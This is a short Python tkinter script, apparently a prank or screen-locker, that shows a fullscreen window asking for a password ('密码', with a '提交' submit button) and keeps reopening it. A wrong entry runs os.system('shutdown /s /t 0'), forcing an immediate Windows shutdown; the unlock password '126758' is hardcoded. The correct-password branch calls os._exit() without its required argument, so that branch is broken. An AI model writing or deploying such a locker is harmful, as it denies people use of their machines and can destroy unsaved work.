import tkinter as tk
import os
def get1():
    global a
    print(a)
    if(mm.get()=="126758"):
        a=True
        os._exit()
    else:
        os.system("shutdown /s /t 0")
        
a=False

while True:
    if a == True:
        break
    wd=tk.Tk()
    wd.attributes("-fullscreen",True)
    wd.title("密码:")
    mm = tk.Entry(wd,width=200)
    mm.pack()
    bn = tk.Button(wd,text="提交",command=get1)
    bn.pack()
    wd.mainloop()
os._exit()